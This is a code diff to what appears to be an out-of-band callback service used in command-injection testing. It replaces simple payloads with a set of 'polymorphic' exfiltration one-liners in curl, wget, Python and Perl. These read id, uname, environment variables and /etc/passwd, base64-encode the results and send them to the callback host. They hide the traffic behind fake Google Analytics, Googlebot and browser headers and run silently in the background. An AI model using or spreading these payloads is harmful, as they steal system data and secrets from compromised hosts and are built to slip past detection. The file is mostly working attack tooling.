@@ -10,21 +10,37 @@ function cbBase(req: Request): string {
   return `${proto}://${host}/api/oob/cb`;
 }
 
+function buildPolymorphicPayloads(base: string, token: string): Record<string, string> {
+  const cb = `${base}/${token}`;
+  return {
+    wget_pixel:
+      `wget -qO/dev/null --user-agent="Mozilla/5.0 AppleWebKit/537.36" "${cb}/pixel.gif?id=$(hostname|base64 -w0 2>/dev/null||hostname|base64)&d=$(id|base64 -w0 2>/dev/null||id|base64)" 2>/dev/null &`,
+    analytics_beacon:
+      `_d=$(id && uname -a 2>&1|base64 -w0 2>/dev/null||id|base64); curl -sk -H "Referer: https://www.google-analytics.com/collect" -H "Content-Type: text/plain" "${cb}?v=1&tid=UA-000000&cid=\${_d:0:8}&t=pageview&dp=%2F&d=\${_d}" 2>/dev/null &`,
+    python3_urllib:
+      `python3 -c "import urllib.request as u,base64,os;d=base64.b64encode(os.popen('id && uname -a && env').read(2048).encode()).decode();u.urlopen(urllib.request.Request('${cb}?d='+d,headers={'User-Agent':'Mozilla/5.0','Accept':'image/webp,*/*'}))" 2>/dev/null &`,
+    curl_font_fetch:
+      `curl -sk -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" -H "Sec-Fetch-Dest: font" -H "Sec-Fetch-Mode: cors" "${cb}?d=$(id|base64 -w0 2>/dev/null||id|base64)" 2>/dev/null &`,
+    curl_post_xhr:
+      `_o=$(id && uname -a && cat /etc/passwd 2>/dev/null|head -5); curl -sk --data-binary "id=$(hostname)&data=$(echo "\${_o}"|base64 -w0 2>/dev/null||echo "\${_o}"|base64)" "${cb}" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Requested-With: XMLHttpRequest" 2>/dev/null &`,
+    bash_pipe_raw:
+      `(id;uname -a;env;cat /etc/passwd 2>/dev/null|head -5)|curl -sk --data-binary @- '${cb}' 2>/dev/null &`,
+    curl_exfil:
+      `_o=$(id && uname -a && hostname && cat /etc/passwd 2>/dev/null|head -5);curl -sk "${cb}?d=$(printf '%s' "$_o"|base64 -w0 2>/dev/null||printf '%s' "$_o"|base64)" 2>/dev/null`,
+    perl_http:
+      `perl -MLWP::UserAgent -e "use MIME::Base64;my \$ua=LWP::UserAgent->new;my \$d=encode_base64(\`id && uname -a\`);chomp(\$d);\$ua->get('${cb}?d='.\$d)" 2>/dev/null &`,
+    python3_socket:
+      `python3 -c "import socket,os,base64;d=base64.b64encode(os.popen('id && uname -a && hostname').read().encode()).decode();s=socket.create_connection(('${cb.replace(/^https?:\/\//, "").split("/")[0]?.split(":")[0]}',80));s.send(b'GET /api/oob/cb/${token}?d='+d.encode()+b' HTTP/1.0\r\nHost: ${cb.replace(/^https?:\/\//, "").split("/")[0]}\r\n\r\n');s.close()" 2>/dev/null &`,
+  };
+}
+
 router.get("/oob/token", (req: Request, res: Response) => {
   const token = generateToken();
   const base  = cbBase(req);
   res.json({
-    token, cbUrl: `${base}/${token}`,
-    payloads: {
-      curl_get:   `curl -sk "${base}/${token}?d=$(id|base64 -w0 2>/dev/null||id|base64)"`,
-      wget_get:   `wget -qO- "${base}/${token}?d=$(id|base64 -w0 2>/dev/null||id|base64)"`,
-      curl_post:  `curl -sk -X POST "${base}/${token}" --data-urlencode "d=$(id)"`,
-      curl_exfil: `_o=$(id && uname -a && hostname && cat /etc/passwd 2>/dev/null|head -5);curl -sk "${base}/${token}?d=$(printf '%s' "$_o"|base64 -w0 2>/dev/null||printf '%s' "$_o"|base64)"`,
-      python3:    `python3 -c "import urllib.request as u,base64,os;u.urlopen('${base}/${token}?d='+base64.b64encode(os.popen('id && uname -a && env').read(4096).encode()).decode())"`,
-      perl:       `perl -MLWP::Simple -e "get('${base}/${token}?d='.join('+',map{sprintf'%02x',ord}split//,\`id\`))"`,
-      bash_pipe:  `(id;uname -a;env;cat /etc/passwd 2>/dev/null)|curl -sk --data-binary @- '${base}/${token}'`,
-      b64_brace:  `{curl,-sk,"${base}/${token}?d=$(id|base64 -w0)"}`,
-    },
+    token,
+    cbUrl: `${base}/${token}`,
+    payloads: buildPolymorphicPayloads(base, token),
   });
 });
 
